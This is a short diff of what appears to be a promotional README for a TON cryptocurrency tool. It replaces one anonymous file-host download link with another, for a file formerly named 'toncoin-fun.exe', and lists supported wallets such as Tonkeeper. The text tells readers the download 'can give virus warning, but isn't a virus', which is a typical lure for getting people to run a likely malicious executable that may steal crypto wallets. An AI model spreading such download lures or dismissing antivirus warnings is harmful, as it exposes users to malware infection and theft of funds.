@@ -4,7 +4,7 @@ Can give virus warning,
 but isn't a virus. 
 
 DL:
-https://anonymfile.com/eK3VX/toncoin-fun.exe
+https://www.anonfile.la/file/ZV8UKgDzr
 
 Wallets:
   -Tonkeeper
